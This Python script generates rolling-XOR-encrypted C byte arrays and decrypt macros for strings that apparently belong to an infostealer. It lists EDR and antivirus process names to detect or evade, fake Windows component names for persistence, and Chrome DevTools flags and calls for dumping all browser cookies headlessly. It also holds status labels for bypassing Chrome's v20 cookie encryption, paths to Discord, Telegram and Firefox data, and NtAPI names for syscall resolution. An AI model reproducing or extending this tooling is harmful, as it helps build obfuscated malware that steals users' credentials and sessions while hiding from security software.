"""Generate rolling XOR encrypted byte arrays for strings."""
import sys

KEY = [0x5A, 0x6D, 0xCB, 0x9F]

def encrypt(plaintext):
    enc = []
    for i, c in enumerate(plaintext):
        enc.append(ord(c) ^ KEY[i % 4])
    return enc

def fmt(name, plaintext):
    enc = encrypt(plaintext)
    hex_bytes = ','.join(f'0x{b:02x}' for b in enc)
    lines = []
    lines.append(f'/* "{plaintext}" */')
    lines.append(f'static const BYTE ENC_{name}[] = {{{hex_bytes}}};')
    lines.append(f'#define DEC_{name}(buf) _xd(buf, ENC_{name}, {len(plaintext)}, 0x5A)')
    lines.append('')
    return '\n'.join(lines)

# EDR Process Names
edr = [
    ("EDR_DEFENDER", "MsMpEng.exe"),
    ("EDR_DEFENDER_ATP", "MsSense.exe"),
    ("EDR_DEFENDER_IR", "SenseIR.exe"),
    ("EDR_DEFENDER_NDR", "SenseNdr.exe"),
    ("EDR_CROWDSTRIKE", "CrowdStrike.exe"),
    ("EDR_CS_FALCON", "CSFalconService.exe"),
    ("EDR_CARBON_BLACK", "cb.exe"),
    ("EDR_CB_REPMGR", "RepMgr.exe"),
    ("EDR_CYLANCE", "cylancesvc.exe"),
    ("EDR_S1_AGENT", "SentinelAgent.exe"),
    ("EDR_S1_HOST", "SentinelServiceHost.exe"),
    ("EDR_CORTEX", "cortex.exe"),
    ("EDR_TRAPS", "Traps.exe"),
    ("EDR_FIREEYE", "xagt.exe"),
    ("EDR_MCAFEE", "mfetp.exe"),
    ("EDR_SOPHOS", "savservice.exe"),
    ("EDR_SOPHOS_CLEAN", "SophosCleanM.exe"),
    ("EDR_TRENDMICRO", "coreServiceShell.exe"),
    ("EDR_SYMANTEC", "SepMasterService.exe"),
]

# Persistence masquerade
persist = [
    ("PERSIST_HEALTH_SYS", "SecurityHealthSystray.exe"),
    ("PERSIST_WAAS_AGENT", "WaaSMedicAgent.exe"),
    ("PERSIST_PROV_HOST", "ProvisioningHost.exe"),
    ("PERSIST_HEALTH_DLL", "SecurityHealthAgent.dll"),
    ("PERSIST_WAAS_DLL", "WaaSMedicSvc.dll"),
    ("PERSIST_PROV_DLL", "ProvisioningComHandler.dll"),
    ("PERSIST_VERSION_DLL", "version.dll"),
]

# Browser exe paths (in chrome_v20.c)
browser = [
    ("CHROME_EXE_PATH", "Google\\Chrome\\Application\\chrome.exe"),
    ("EDGE_EXE_PATH", "Microsoft\\Edge\\Application\\msedge.exe"),
    ("BRAVE_EXE_PATH", "BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
]

# CDP strings
cdp = [
    ("CDP_HEADLESS_FLAGS", "--headless=new --remote-debugging-port="),
    ("CDP_NO_FIRST", "--no-first-run --disable-gpu"),
    ("CDP_GET_COOKIES", "Network.getAllCookies"),
    ("CDP_WS_KEY", "webSocketDebuggerUrl"),
    ("CDP_CREATE_TARGET", "Target.createTarget"),
    ("CDP_ATTACH_TARGET", "Target.attachToTarget"),
    ("CDP_PAGE_NAVIGATE", "Page.navigate"),
    ("CDP_RESTORE_SESSION", "--restore-last-session"),
]

# Stealer status/labels
status = [
    ("STATUS_V20_BLOCKED", "v20_blocked"),
    ("STATUS_V20_ACTIVE", "v20_active"),
    ("STATUS_V20_ENC", "[v20-encrypted]"),
    ("STATUS_DPAPI_FAIL", "dpapi_fail"),
    ("STATUS_AES_FAIL", "aes_fail"),
    ("STATUS_OK", "ok"),
    ("LABEL_CHROME", "Chrome"),
    ("LABEL_EDGE", "Edge"),
    ("LABEL_BRAVE", "Brave"),
    ("LABEL_OPERA", "Opera"),
    ("LABEL_VIVALDI", "Vivaldi"),
    ("LABEL_DISCORD", "Discord"),
    ("LABEL_DISCORD_PTB", "Discord PTB"),
    ("LABEL_DISCORD_CAN", "Discord Canary"),
]

# Discord/Telegram paths
app_paths = [
    ("DISCORD_PATH", "discord"),
    ("DISCORD_PTB_PATH", "discordptb"),
    ("DISCORD_CAN_PATH", "discordcanary"),
    ("TELEGRAM_TDATA", "Telegram Desktop\\tdata"),
    ("FIREFOX_PROFILES", "Mozilla\\Firefox\\Profiles"),
]

# NtAPI strings (for syscall resolution)  
ntapi = [
    ("NT_QUERY_SYS_INFO", "NtQuerySystemInformation"),
    ("NT_QUERY_INFO_PROC", "NtQueryInformationProcess"),
    ("NT_QUERY_VIRT_MEM", "NtQueryVirtualMemory"),
    ("NT_DELAY_EXEC", "NtDelayExecution"),
]

print("/* ── EDR Process Names (encrypted) ── */")
for name, val in edr:
    print(fmt(name, val))

print("\n/* ── Persistence Names (encrypted) ── */")
for name, val in persist:
    print(fmt(name, val))

print("\n/* ── Browser Exe Paths (encrypted) ── */")
for name, val in browser:
    print(fmt(name, val))

print("\n/* ── CDP Strings (encrypted) ── */")
for name, val in cdp:
    print(fmt(name, val))

print("\n/* ── Status/Labels (encrypted) ── */")
for name, val in status:
    print(fmt(name, val))

print("\n/* ── App Paths (encrypted) ── */")
for name, val in app_paths:
    print(fmt(name, val))

print("\n/* ── NtAPI Strings (encrypted) ── */")
for name, val in ntapi:
    print(fmt(name, val))
